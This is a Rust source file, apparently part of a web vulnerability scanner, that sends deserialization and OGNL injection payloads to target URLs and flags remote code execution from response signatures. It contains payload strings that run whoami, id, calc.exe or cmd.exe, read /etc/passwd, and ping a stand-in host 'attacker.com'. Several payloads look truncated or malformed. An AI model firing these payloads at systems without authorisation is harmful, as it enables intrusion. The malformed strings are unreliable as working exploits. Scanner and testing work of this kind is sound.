//! Deserialization vulnerability scanner
//!
//! Detects unsafe deserialization vulnerabilities across multiple languages:
//! - Java (Apache Commons Collections, ysoserial payloads, ROME, Spring, XStream)
//! - Python (pickle, shelve, marshal, dill, PyYAML unsafe_load)
//! - PHP (unserialize, SoapClient, Laravel/Symfony chains)
//! - JSON/YAML (prototype pollution, OGNL expression injection)
//!
//! Deserialization flaws can lead to Remote Code Execution (RCE) and
//! are ranked as Critical severity when confirmed.

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use base64::prelude::*;
use reqwest::Client;
use std::time::Duration;

/// Deserialization attack technique
#[derive(Debug, Clone, PartialEq)]
pub enum DeserTechnique {
    /// Java deserialization with Apache Commons Collections
    JavaCommonsCollections,
    /// Java deserialization with ysoserial payload
    JavaYsoserial,
    /// Java ROME library deserialization
    JavaRome,
    /// Java Spring Framework deserialization
    JavaSpring,
    /// Java XStream deserialization
    JavaXstream,
    /// Java JRMP (Java RMI) exploitation
    JavaJrmp,
    /// Python pickle __reduce__ RCE
    PythonPickle,
    /// Python shelve deserialization
    PythonShelve,
    /// Python marshal deserialization
    PythonMarshal,
    /// Python dill deserialization
    PythonDill,
    /// Python PyYAML unsafe_load
    PythonYaml,
    /// PHP unserialize with SoapClient
    PhpSoapClient,
    /// PHP unserialize with __wakeup bypass
    PhpWakeup,
    /// PHP Laravel POP chains
    PhpLaravel,
    /// PHP Symfony POP chains
    PhpSymfony,
    /// JSON prototype pollution
    JsonPrototypePollution,
    /// YAML unsafe parsing
    YamlUnsafe,
    /// OGNL expression injection (Struts, Confluence)
    OgnlInjection,
    /// .NET BinaryFormatter deserialization
    DotNetFormatter,
    /// .NET LosFormatter deserialization
    DotNetLosFormatter,
    /// .NET JavaScriptSerializer deserialization
    DotNetJavaScriptSerializer,
    /// Ruby Marshal deserialization
    RubyMarshal,
}

impl DeserTechnique {
    /// Get severity for this technique
    pub fn severity(&self) -> VulnSeverity {
        match self {
            // All RCE-capable techniques are Critical
            DeserTechnique::JavaCommonsCollections
            | DeserTechnique::JavaYsoserial
            | DeserTechnique::JavaRome
            | DeserTechnique::JavaSpring
            | DeserTechnique::JavaXstream
            | DeserTechnique::JavaJrmp
            | DeserTechnique::PythonPickle
            | DeserTechnique::PythonShelve
            | DeserTechnique::PythonMarshal
            | DeserTechnique::PythonDill
            | DeserTechnique::PythonYaml
            | DeserTechnique::PhpSoapClient
            | DeserTechnique::PhpWakeup
            | DeserTechnique::PhpLaravel
            | DeserTechnique::PhpSymfony
            | DeserTechnique::DotNetFormatter
            | DeserTechnique::DotNetLosFormatter
            | DeserTechnique::DotNetJavaScriptSerializer
            | DeserTechnique::RubyMarshal => VulnSeverity::Critical,

            // Prototype pollution and OGNL are High severity
            DeserTechnique::JsonPrototypePollution
            | DeserTechnique::YamlUnsafe
            | DeserTechnique::OgnlInjection => VulnSeverity::High,
        }
    }

    /// Get description
    pub fn description(&self) -> &'static str {
        match self {
            DeserTechnique::JavaCommonsCollections => "Java deserialization using Apache Commons Collections gadget chain (CVE-2015-4852)",
            DeserTechnique::JavaYsoserial => "Java deserialization using ysoserial generated payload",
            DeserTechnique::JavaRome => "Java ROME library deserialization vulnerability",
            DeserTechnique::JavaSpring => "Java Spring Framework deserialization vulnerability",
            DeserTechnique::JavaXstream => "Java XStream deserialization vulnerability",
            DeserTechnique::JavaJrmp => "Java RMI JRMP exploitation",
            DeserTechnique::PythonPickle => "Python pickle deserialization with __reduce__ RCE",
            DeserTechnique::PythonShelve => "Python shelve format deserialization",
            DeserTechnique::PythonMarshal => "Python marshal format deserialization",
            DeserTechnique::PythonDill => "Python dill serialization library RCE",
            DeserTechnique::PythonYaml => "Python PyYAML unsafe_load with arbitrary code execution",
            DeserTechnique::PhpSoapClient => "PHP unserialize with SoapClient SSRF/RCE",
            DeserTechnique::PhpWakeup => "PHP __wakeup bypass CVE-2016-7124",
            DeserTechnique::PhpLaravel => "PHP Laravel POP chain exploitation",
            DeserTechnique::PhpSymfony => "PHP Symfony POP chain exploitation",
            DeserTechnique::JsonPrototypePollution => "JavaScript prototype pollution via JSON merge",
            DeserTechnique::YamlUnsafe => "Unsafe YAML parsing allowing code execution",
            DeserTechnique::OgnlInjection => "OGNL expression injection in Apache Struts/Confluence",
            DeserTechnique::DotNetFormatter => ".NET BinaryFormatter unsafe deserialization",
            DeserTechnique::DotNetLosFormatter => ".NET LosFormatter view state deserialization",
            DeserTechnique::DotNetJavaScriptSerializer => ".NET JavaScriptSerializer unsafe deserialization",
            DeserTechnique::RubyMarshal => "Ruby Marshal format deserialization RCE",
        }
    }

    /// Get CVE reference if applicable
    pub fn cve(&self) -> Option<&'static str> {
        match self {
            DeserTechnique::JavaCommonsCollections => Some("CVE-2015-4852"),
            DeserTechnique::PhpWakeup => Some("CVE-2016-7124"),
            DeserTechnique::OgnlInjection => Some("CVE-2017-5638"),
            DeserTechnique::JavaSpring => Some("CVE-2010-1622"),
            _ => None,
        }
    }
}

/// Detected serialization format
#[derive(Debug, Clone, PartialEq)]
pub enum SerializationFormat {
    /// Java serialized format (AC ED 00 05 magic bytes)
    JavaSerialized,
    /// Python pickle format
    PythonPickle,
    /// PHP serialized format
    PhpSerialized,
    /// .NET serialized format
    DotNetSerialized,
    /// Ruby Marshal format
    RubyMarshal,
    /// JSON format
    Json,
    /// YAML format
    Yaml,
    /// Unknown format
    Unknown,
}

/// Parameter names commonly accepting serialized data
const SERIALIZED_PARAMS: &[&str] = &[
    "data", "object", "payload", "serialized", "input", "session", "state",
    "user", "auth", "token", "config", "settings", "prefs", "profile",
    "message", "request", "response", "result", "output", "value", "item",
    "obj", "o", "p", "q", "s", "r", "content", "body", "xml", "json",
    "yaml", "yml", "pickle", "data", "blob", "binary", "base64", "b64",
    "serialized_data", "ser_data", "object_data", "obj_data", "auth_token",
    "session_data", "user_data", "r", "redirect", "next", "return", "callback",
];

/// Java serialized magic bytes
const JAVA_MAGIC: &[u8] = &[0xAC, 0xED, 0x00, 0x05];

/// PHP serialized patterns
const PHP_PATTERNS: &[&str] = &[
    "O:1:", "O:8:", "a:1:", "s:1:", "b:1:", "i:0;", "d:1;", "N;",
];

/// Python pickle magic bytes/protocol indicators
const PICKLE_PATTERNS: &[&str] = &[
    ".", "(", ")", "S'", "V", "p0", "(dp0", "(lp0", "c__main__",
];

/// .NET serialized patterns
const DOTNET_PATTERNS: &[&str] = &[
    "\x01\x00\x00\x00",  // BinaryFormatter record type
    "AAECAz",             // Base64 encoded .NET
    "/wAAAA",             // Alternative .NET signature
];

/// Ruby Marshal patterns (major version 4.8 = Marshal format)
const RUBY_MARSHAL_PATTERNS: &[&str] = &[
    "\x04\x08",  // Marshal format version 4.8
];

/// Success signatures for RCE detection
const RCE_SIGNATURES: &[&str] = &[
    // Command execution indicators
    "root:", "uid=", "gid=", "groups=",
    "www-data:", "/bin/bash", "/bin/sh",
    "Windows IP", "IPv4 Address", "MAC Address",
    "System32", "C:\\Windows",

    // Command output
    "PING ", "Reply from ", "bytes from",
    "Packets:", "TTL=",

    // Error messages that indicate deserialization
    "ClassNotFoundException", "InvalidClassException",
    "ObjectStreamException", "pickle.UnpicklingError",
    "unserialize(): Error", "SoapClient::__call()",

    // Library-specific
    "org.apache.commons.collections", "org.springframework",
    "sun.reflect.annotation", "ysoserial",
    "ROME", "XStream", "SpringFramework",

    // Python pickle indicators
    "__reduce__", "pickle.loads", "cPickle",
    "dill.loads", "marshal.loads",

    // PHP indicators
    "__destruct(", "__wakeup(", "SoapClient",
    "Laravel\\", "Symfony\\Component",

    // YAML indicators
    "!!python/object", "!!python/module",
    "Psych::BadAlias", "unsafe_load",
];

/// Java deserialization payloads
const JAVA_PAYLOADS: &[(&str, &str, DeserTechnique)] = &[
    // Apache Commons Collections (CVE-2015-4852)
    // Base64 encoded minimal payload (would trigger class loading)
    ("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwABmNvbXBhcmF0b3J0ABBMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBzcgAXamF2YS5sYW5nLkF1dG9tb3JwaGljh4j MCCSYAIAAUwABW1pbGV0AAZTZXJpYWx1aWQABExJQVoAABJO", "commons_collections_basic", DeserTechnique::JavaCommonsCollections),

    // ysoserial CommonsCollections1
    ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAA/AAAA", "ysoserial_cc1", DeserTechnique::JavaYsoserial),

    // ROME payload variant
    ("rO0ABXNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5WiQ4ZDRhNTNmYQIAAUwABWtleXQAE1tMamF2YS9sYW5nL09iamVjdDtMAANtYXB0ABNMamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UcmF5aXRlbml0aXphdGlvbkV4Y2VwdGlvbjAaD6iY0bJcAgABTAAHZXJyb3JzdAATTGphdmEvdXRpbC9MaXN0O3hwc3IAK2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy5UcmF5", "rome_variant", DeserTechnique::JavaRome),

    // Spring Framework deserialization
    ("rO0ABXNyADdvcmdzcmluZ2ZyYW1ld29yay5zZWN1cml0eS5jb250ZXh0LlVzZXJSb2xlVjJMaXN0CTI1YzMwZjk2AgAAWgAFc291cmNldAAzTG9yZ3Mvc3ByaW5nZnJhbWV3b3JrL3NlY3VyaXR5L2NvbnRleHQvVXNlclJvbGU7eHBxAH4AAgAAAAAA", "spring_framework", DeserTechnique::JavaSpring),

    // XStream deserialization
    ("<sorted-set><string>test</string><dynamic-proxy><interface>java.lang.Comparable</interface><handler class=\"sun.reflect.annotation.AnnotationInvocationHandler\"><member-sets><map><entry><string>foo</string><string>bar</string></entry></map></member-sets></handler></dynamic-proxy></sorted-set>", "xstream_xml", DeserTechnique::JavaXstream),

    // JRMP exploitation pattern
    ("rO0ABXNyABdqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN0AAAAAAAAAAAAAAA", "jrmp_basic", DeserTechnique::JavaJrmp),

    // JSON gadget chains
    ("{\"cmd\":\"calc.exe\",\"map\":{\"class\":\"org.apache.commons.collections.map.LazyMap\"}}", "json_gadget", DeserTechnique::JavaCommonsCollections),
];

/// Python deserialization payloads
const PYTHON_PAYLOADS: &[(&str, &str, DeserTechnique)] = &[
    // Basic pickle with __reduce__ (RCE)
    ("g尐\n(S'ls'\ntR.", "pickle_reduce_basic", DeserTechnique::PythonPickle),

    // Pickle with os.system
    ("cos\nsystem\n(S'whoami'\ntR.", "pickle_os_system", DeserTechnique::PythonPickle),

    // Pickle with subprocess
    ("csubprocess\ncheck_output\n(S'whoami'\ntR.", "pickle_subprocess", DeserTechnique::PythonPickle),

    // Pickle protocol 2
    ("(dp0\nS'command'\np1\nS'whoami'\np2\ns.", "pickle_proto2", DeserTechnique::PythonPickle),

    // Pickle with base64 encoded command
    ("Y29zCnN5c3RlbQooUydsnW9hbWknCnRS", "pickle_b64", DeserTechnique::PythonPickle),

    // Dill serialization
    ("dill\n_loads\n(gapply\n(cos\nsubprocess\ncheck_output\n(S'ls -la'\ntRtR.", "dill_rce", DeserTechnique::PythonDill),

    // Marshal format (Python 2/3)
    ("eJwBLgQ2/2QAAABhbgA=", "marshal_basic", DeserTechnique::PythonMarshal),

    // Shelve format
    ("('shelfvalue', p0\n(dp1\nS'test'\np2\n.", "shelve_basic", DeserTechnique::PythonShelve),

    // PyYAML unsafe
    ("!!python/object/apply:os.system\nargs: ['whoami']", "yaml_system", DeserTechnique::PythonYaml),

    // PyYAML with dangerous constructor
    ("!!python/object/new:os.system\nargs: ['id']", "yaml_new", DeserTechnique::PythonYaml),

    // PyYAML with module
    ("!!python/module:os.system\nargs: ['uname']", "yaml_module", DeserTechnique::PythonYaml),
];

/// PHP deserialization payloads
const PHP_PAYLOADS: &[(&str, &str, DeserTechnique)] = &[
    // Basic object injection
    ("O:8:\"stdClass\":0:{}", "stdclass_basic", DeserTechnique::PhpWakeup),

    // SoapClient for SSRF
    ("O:10:\"SoapClient\":3:{s:3:\"uri\";s:10:\"http://test\";s:8:\"location\";s:25:\"http://127.0.0.1:8080/test\";s:13:\"_soap_version\";i:1;}", "soapclient_ssrf", DeserTechnique::PhpSoapClient),

    // CVE-2016-7124 __wakeup bypass
    ("O:8:\"stdClass\":1:{s:4:\"test\";N;}", "wakeup_bypass", DeserTechnique::PhpWakeup),

    // Laravel POP chain (simplified)
    ("O:40:\"Illuminate\\Foundation\\Application\":0:{}", "laravel_app", DeserTechnique::PhpLaravel),

    ("O:32:\"Illuminate\\Broadcasting\\PendingBroadcast\":0:{}", "laravel_broadcast", DeserTechnique::PhpLaravel),

    // Symfony POP chain
    ("O:37:\"Symfony\\Component\\Cache\\CacheItem\":0:{}", "symfony_cache", DeserTechnique::PhpSymfony),

    ("O:40:\"Symfony\\Component\\HttpKernel\\Controller\\ControllerResolver\":0:{}", "symfony_controller", DeserTechnique::PhpSymfony),

    // Phar deserialization wrapper
    ("O:17:\"Phar\":0:{S:19:\"\";O:8:\"stdClass\":0:{}}", "phar_wrapper", DeserTechnique::PhpWakeup),

    // Monolog RCE chain
    ("O:27:\"Monolog\\Handler\\SyslogHandler\":0:{}", "monolog_handler", DeserTechnique::PhpLaravel),

    // Guzzle Request
    ("O:24:\"GuzzleHttp\\Psr7\\Request\":0:{}", "guzzle_request", DeserTechnique::PhpLaravel),

    // Error-based with __destruct
    ("O:7:\"Process\":1:{s:5:\"cmd\";s:6:\"whoami\";}", "error_destruct", DeserTechnique::PhpWakeup),

    // Array object for auto-loader
    ("a:1:{i:0;O:8:\"stdClass\":0:{}}", "array_object", DeserTechnique::PhpWakeup),

    // DirectoryIterator for disclosure
    ("O:17:\"DirectoryIterator\":1:{s:4:\"path\";s:1:\".\";}", "directory_iterator", DeserTechnique::PhpWakeup),

    // SplFileObject for file read
    ("O:13:\"SplFileObject\":2:{s:8:\"filename\";s:11:\"/etc/passwd\";s:7:\"open_mode\";s:1:\"r\";}", "splfileobject", DeserTechnique::PhpWakeup),

    // SoapClient with CRLF injection
    ("O:10:\"SoapClient\":3:{s:3:\"uri\";s:10:\"http://test\";s:8:\"location\";s:25:\"http://127.0.0.1:8080/test\";s:13:\"_soap_version\";i:1;s:13:\"__soap_headers\";a:1:{i:0;O:9:\"SoapHeader\":2:{s:6:\"\";s:2:\"\";s:5:\"\";s:2:\"\";}}}", "soapclient_crlf", DeserTechnique::PhpSoapClient),
];

/// JSON/YAML prototype pollution payloads
const JSON_YAML_PAYLOADS: &[(&str, &str, DeserTechnique)] = &[
    // JavaScript prototype pollution
    ("{\"__proto__\":{\"isAdmin\":true}}", "proto_admin", DeserTechnique::JsonPrototypePollution),

    ("{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}", "constructor_pollute", DeserTechnique::JsonPrototypePollution),

    ("{\"__proto__\":{\"shell\":\"ping -c 1 attacker.com\"}}", "proto_shell", DeserTechnique::JsonPrototypePollution),

    // jQuery extend() pollution
    ("{\"__proto__\":{\"data\":\"malicious\"}}", "jquery_extend", DeserTechnique::JsonPrototypePollution),

    // Merge operation pollution
    ("{\"a\":\"b\"}__proto__[isAdmin]=true", "merge_pollution", DeserTechnique::JsonPrototypePollution),

    // Unsafe YAML (Psych parser)
    ("--- !ruby/hash:ActionController::Parameters\nallowed?: true\nisAdmin: true\n", "yaml_ruby", DeserTechnique::YamlUnsafe),

    ("--- !!map\n__proto__:\n  isAdmin: true\n", "yaml_proto", DeserTechnique::YamlUnsafe),

    // YAML with Psych unsafe tags
    ("--- !ruby/object:User\nattributes:\n  admin: true\n", "yaml_psych_unsafe", DeserTechnique::YamlUnsafe),

    // PyYAML unsafe tags
    ("!!python/object/apply:subprocess.check_output\nargs: [['whoami']]", "yaml_python_subprocess", DeserTechnique::PythonYaml),

    ("!!python/object/apply:eval\nargs: ['__import__(\"os\").system(\"id\")']", "yaml_python_eval", DeserTechnique::PythonYaml),
];

/// OGNL injection payloads
const OGNL_PAYLOADS: &[(&str, &str, DeserTechnique)] = &[
    // Basic OGNL expression
    ("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('calc.exe')", "ognl_runtime", DeserTechnique::OgnlInjection),

    // Struts 2 vulnerability patterns
    ("%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('calc.exe')}", "struts_basic", DeserTechnique::OgnlInjection),

    // Confluence OGNL
    ("#context['xwork.MethodAccessor.denyMethodExecution']=false,#_memberAccess.allowStaticMethodAccess=true,#cmd='whoami',#ret=@java.lang.Runtime@getRuntime().exec(#cmd),#s=new java.io.Scanner(#ret.getInputStream()).useDelimiter('\\\\A'),#str=#s.hasNext()?#s.next():'',#str", "confluence_ognl", DeserTechnique::OgnlInjection),

    // Method invocation
    ("@java.lang.System@getenv()", "ognl_getenv", DeserTechnique::OgnlInjection),

    // Class loading
    ("@java.lang.Class@forName('java.lang.Runtime')", "ognl_forname", DeserTechnique::OgnlInjection),

    // Static method access
    ("@java.lang.Runtime@getRuntime().exec('whoami')", "ognl_static_exec", DeserTechnique::OgnlInjection),

    // Context manipulation
    ("#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']", "ognl_context", DeserTechnique::OgnlInjection),

    // Container-based injection
    ("#container=#context['com.opensymphony.xwork2.ActionContext.container'],#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class),#ognlUtil.getRuntime()]", "ognl_container", DeserTechnique::OgnlInjection),

    // WebWork OGNL
    ("%{#req=@com.opensymphony.webwork.ServletActionContext@getRequest(),#resp=#req.getResponse(),#resp.setCharacterEncoding('UTF-8'),#resp.getWriter().print('test')}", "webwork_ognl", DeserTechnique::OgnlInjection),
];

/// .NET deserialization payloads
const DOTNET_PAYLOADS: &[(&str, &str, DeserTechnique)] = &[
    // BinaryFormatter gadget chain
    ("AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy", "binaryformatter_basic", DeserTechnique::DotNetFormatter),

    // LosFormatter (view state)
    ("/wEYAgIAAAAPRKY+gSQtlqTUpb+O", "losformatter_basic", DeserTechnique::DotNetLosFormatter),

    // JavaScriptSerializer
    ("{\"__type\":\"System.Data.DataSet, System.Data\"}", "jsontype_dataset", DeserTechnique::DotNetJavaScriptSerializer),

    // ActivitySurrogateSelector gadget
    ("AAEAAAD/////", "activity_surrogate", DeserTechnique::DotNetFormatter),

    // TextFormattingRunProperties
    ("AAECAgAAAAA=", "text_formatting", DeserTechnique::DotNetFormatter),

    // PSObject attack
    ("{\"__type\":\"System.Management.Automation.PSObject, System.Management.Automation\",\"Members\":[{\"TypeName\":\"System.Diagnostics.Process\",\"MemberType\":8,\"Value\":{\"StartInfo\":{\"FileName\":\"cmd.exe\",\"Arguments\":\"/c calc\"}}}]}", "psobject_rce", DeserTechnique::DotNetJavaScriptSerializer),
];

/// Ruby Marshal payloads
const RUBY_PAYLOADS: &[(&str, &str, DeserTechnique)] = &[
    // Basic Marshal format with ERB code execution
    ("\x04\x08o:@ActiveSupport::DeprecationProxy\x00T", "erb_proxy", DeserTechnique::RubyMarshal),

    // Rails 5.x ERB
    ("\x04\x08o:@ERB\x07T", "erb_basic", DeserTechnique::RubyMarshal),

    // Symbol table attack
    ("\x04\x08I:\x0E@symbol_table", "symbol_table", DeserTechnique::RubyMarshal),

    // ActiveSupport::Duration
    ("\x04\x08o:\x1EActiveSupport::Duration", "duration_attack", DeserTechnique::RubyMarshal),
];

pub struct DeserializationScanner {
    client: Client,
    config: ScannerConfig,
}

impl DeserializationScanner {
    pub fn new(config: ScannerConfig) -> Self {
        let timeout = Duration::from_secs(15);
        let client = Client::builder()
            .timeout(timeout)
            .user_agent(&config.user_agent)
            .redirect(reqwest::redirect::Policy::limited(3))
            .build()
            .expect("Failed to create HTTP client for deserialization scanner");

        Self { client, config }
    }

    pub async fn scan(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Phase 1: Fingerprint serialization format
        let format = self.fingerprint_format(url).await;
        report.merge(self.check_java_deserialization(url, &format).await?);
        report.merge(self.check_python_deserialization(url).await?);
        report.merge(self.check_php_deserialization(url).await?);

        // Aggressive mode: extended checks
        if self.config.aggressive {
            report.merge(self.check_json_yaml_pollution(url).await?);
            report.merge(self.check_ognl_injection(url).await?);
            report.merge(self.check_dotnet_deserialization(url).await?);
            report.merge(self.check_ruby_deserialization(url).await?);
        }

        Ok(report)
    }

    /// Fingerprint the serialization format from responses
    async fn fingerprint_format(&self, url: &str) -> SerializationFormat {
        // Try GET request
        if let Ok(response) = self.client.get(url).send().await {
            if let Ok(bytes) = response.bytes().await {
                if let Some(format) = self.detect_format_from_bytes(&bytes) {
                    return format;
                }
            }
        }

        // Try POST with sample data
        let sample_data = "test";
        if let Ok(response) = self.client.post(url).body(sample_data).send().await {
            if let Ok(text) = response.text().await {
                return self.detect_format_from_text(&text);
            }
        }

        SerializationFormat::Unknown
    }

    /// Detect format from raw bytes
    fn detect_format_from_bytes(&self, data: &[u8]) -> Option<SerializationFormat> {
        // Check for Java serialization magic bytes
        if data.starts_with(JAVA_MAGIC) {
            return Some(SerializationFormat::JavaSerialized);
        }

        // Check for Ruby Marshal
        for pattern in RUBY_MARSHAL_PATTERNS {
            if data.starts_with(pattern.as_bytes()) {
                return Some(SerializationFormat::RubyMarshal);
            }
        }

        None
    }

    /// Detect format from text
    fn detect_format_from_text(&self, text: &str) -> SerializationFormat {
        // Check for PHP serialization
        for pattern in PHP_PATTERNS {
            if text.contains(pattern) {
                return SerializationFormat::PhpSerialized;
            }
        }

        // Check for Python pickle
        for pattern in PICKLE_PATTERNS {
            if text.contains(pattern) {
                return SerializationFormat::PythonPickle;
            }
        }

        // Check for .NET serialization
        for pattern in DOTNET_PATTERNS {
            if text.contains(pattern) {
                return SerializationFormat::DotNetSerialized;
            }
        }

        SerializationFormat::Unknown
    }

    /// Check for Java deserialization vulnerabilities
    async fn check_java_deserialization(&self, url: &str, _format: &SerializationFormat) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, name, technique) in JAVA_PAYLOADS {
            for param in SERIALIZED_PARAMS.iter().take(15) {
                if let Some(vuln) = self.test_deser_payload(url, param, payload, name, technique).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check for Python deserialization vulnerabilities
    async fn check_python_deserialization(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, name, technique) in PYTHON_PAYLOADS {
            for param in SERIALIZED_PARAMS.iter().take(10) {
                if let Some(vuln) = self.test_deser_payload(url, param, payload, name, technique).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check for PHP deserialization vulnerabilities
    async fn check_php_deserialization(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, name, technique) in PHP_PAYLOADS {
            for param in SERIALIZED_PARAMS.iter().take(10) {
                if let Some(vuln) = self.test_deser_payload(url, param, payload, name, technique).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check for JSON/YAML prototype pollution
    async fn check_json_yaml_pollution(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, name, technique) in JSON_YAML_PAYLOADS {
            for param in SERIALIZED_PARAMS.iter().take(8) {
                if let Some(vuln) = self.test_json_payload(url, param, payload, name, technique).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check for OGNL injection
    async fn check_ognl_injection(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // OGNL uses specific parameter names
        let ognl_params = &["id", "name", "redirect", "return", "callback", "url", "link"];

        for (payload, name, technique) in OGNL_PAYLOADS {
            for param in ognl_params {
                // URL encode the OGNL expression
                let encoded_payload = urlencoding::encode(payload);

                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, encoded_payload)
                } else {
                    format!("{}?{}={}", url, param, encoded_payload)
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if let Ok(text) = response.text().await {
                        if self.check_ognl_response(&text) {
                            report.add_finding(Vuln {
                                severity: technique.severity(),
                                title: format!("OGNL Injection: {}", name),
                                description: format!(
                                    "OGNL expression injection detected. {}",
                                    technique.description()
                                ),
                                location: Some(test_url),
                                recommendation: Some(
                                    "Disable OGNL expression evaluation. \
                                     Use parameterized queries. Update to Struts 2.5.26+ or Confluence LTS. \
                                     Sanitize all user input before expression evaluation.".to_string()
                                ),
                                cwe: technique.cve().map(|c| c.to_string()),
                                owasp: Some("A03:2021 - Injection".to_string()),
                            });
                            break;
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Check for .NET deserialization
    async fn check_dotnet_deserialization(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, name, technique) in DOTNET_PAYLOADS {
            for param in SERIALIZED_PARAMS.iter().take(8) {
                if let Some(vuln) = self.test_deser_payload(url, param, payload, name, technique).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check for Ruby deserialization
    async fn check_ruby_deserialization(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, name, technique) in RUBY_PAYLOADS {
            for param in SERIALIZED_PARAMS.iter().take(8) {
                if let Some(vuln) = self.test_binary_payload(url, param, payload.as_bytes(), name, technique).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Test deserialization payload via parameter
    async fn test_deser_payload(
        &self,
        url: &str,
        param: &str,
        payload: &str,
        name: &str,
        technique: &DeserTechnique,
    ) -> Result<Option<Vuln>> {
        let encoded = urlencoding::encode(payload);
        let test_url = if url.contains('?') {
            format!("{}&{}={}", url, param, encoded)
        } else {
            format!("{}?{}={}", url, param, encoded)
        };

        self.test_payload_direct(&test_url, payload, name, technique).await
    }

    /// Test JSON payload
    async fn test_json_payload(
        &self,
        url: &str,
        param: &str,
        payload: &str,
        name: &str,
        technique: &DeserTechnique,
    ) -> Result<Option<Vuln>> {
        let encoded = urlencoding::encode(payload);
        let test_url = if url.contains('?') {
            format!("{}&{}={}", url, param, encoded)
        } else {
            format!("{}?{}={}", url, param, encoded)
        };

        self.test_json_direct(&test_url, payload, name, technique).await
    }

    /// Test binary payload
    async fn test_binary_payload(
        &self,
        url: &str,
        param: &str,
        payload: &[u8],
        name: &str,
        technique: &DeserTechnique,
    ) -> Result<Option<Vuln>> {
        let encoded = base64::prelude::BASE64_STANDARD.encode(payload);
        let test_url = if url.contains('?') {
            format!("{}&{}={}", url, param, encoded)
        } else {
            format!("{}?{}={}", url, param, encoded)
        };

        self.test_binary_direct(&test_url, payload, name, technique).await
    }

    /// Test payload directly
    async fn test_payload_direct(
        &self,
        url: &str,
        payload: &str,
        name: &str,
        technique: &DeserTechnique,
    ) -> Result<Option<Vuln>> {
        // Try GET request
        if let Ok(response) = self.client.get(url).send().await {
            if let Ok(text) = response.text().await {
                if self.check_rce_indicators(&text) {
                    return Ok(Some(self.create_vuln(name, technique, url, &text)));
                }
            }
        }

        // Try POST request
        let post_data = format!("data={}", urlencoding::encode(payload));
        if let Ok(response) = self.client.post(url)
            .header("content-type", "application/x-www-form-urlencoded")
            .body(post_data)
            .send()
            .await
        {
            if let Ok(text) = response.text().await {
                if self.check_rce_indicators(&text) {
                    return Ok(Some(self.create_vuln(name, technique, url, &text)));
                }
            }
        }

        Ok(None)
    }

    /// Test JSON payload directly
    async fn test_json_direct(
        &self,
        url: &str,
        payload: &str,
        name: &str,
        technique: &DeserTechnique,
    ) -> Result<Option<Vuln>> {
        // Try POST with JSON content type
        if let Ok(response) = self.client.post(url)
            .header("content-type", "application/json")
            .body(payload.to_string())
            .send()
            .await
        {
            if let Ok(text) = response.text().await {
                if self.check_pollution_indicators(&text) || self.check_rce_indicators(&text) {
                    return Ok(Some(self.create_vuln(name, technique, url, &text)));
                }
            }
        }

        Ok(None)
    }

    /// Test binary payload directly
    async fn test_binary_direct(
        &self,
        url: &str,
        payload: &[u8],
        name: &str,
        technique: &DeserTechnique,
    ) -> Result<Option<Vuln>> {
        // Try POST with binary data
        if let Ok(response) = self.client.post(url)
            .header("content-type", "application/octet-stream")
            .body(payload.to_vec())
            .send()
            .await
        {
            if let Ok(text) = response.text().await {
                if self.check_rce_indicators(&text) {
                    return Ok(Some(self.create_vuln(name, technique, url, &text)));
                }
            }
        }

        Ok(None)
    }

    /// Check OGNL response indicators
    fn check_ognl_response(&self, text: &str) -> bool {
        let text_lower = text.to_lowercase();

        // Check for OGNL-specific responses
        for signature in &[
            "ognl", "struts", "webwork", "xwork", "confluence",
            "devmode", "freemarker", "velocity",
        ] {
            if text_lower.contains(signature) {
                return true;
            }
        }

        // Check for command output
        self.check_rce_indicators(text)
    }

    /// Check for RCE indicators in response
    fn check_rce_indicators(&self, text: &str) -> bool {
        let text_lower = text.to_lowercase();

        for signature in RCE_SIGNATURES {
            if text.contains(signature) || text_lower.contains(&signature.to_lowercase()) {
                return true;
            }
        }

        false
    }

